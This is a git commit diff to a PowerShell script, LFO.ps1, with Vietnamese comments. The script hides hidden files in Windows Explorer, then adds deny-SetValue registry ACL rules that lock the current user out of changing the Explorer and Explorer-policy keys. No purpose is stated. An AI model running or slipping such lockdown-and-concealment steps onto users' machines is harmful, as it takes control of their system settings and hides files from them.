63ea9c172b906180aa18bb0663c75c7fcdf85ff6
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-06-05 10:12:46 +0700

    LFO.ps1

--- LFO.ps1
+++ LFO.ps1
@@ -6,4 +6,16 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
 -Name "Hidden" -Value 2
 Stop-Process -Name explorer -Force
+# Khóa quyền chỉnh sửa key 'Explorer\Advanced'
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+$acl = Get-Acl $regPath
+$rule = New-Object System.Security.AccessControl.RegistryAccessRule("$(whoami)", "SetValue", "Deny")
+$acl.AddAccessRule($rule)
+Set-Acl $regPath $acl
+# Khóa key 'Policies\Explorer'
+$regPath2 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+$acl2 = Get-Acl $regPath2
+$rule2 = New-Object System.Security.AccessControl.RegistryAccessRule("$(whoami)", "SetValue", "Deny")
+$acl2.AddAccessRule($rule2)
+Set-Acl $regPath2 $acl2
 
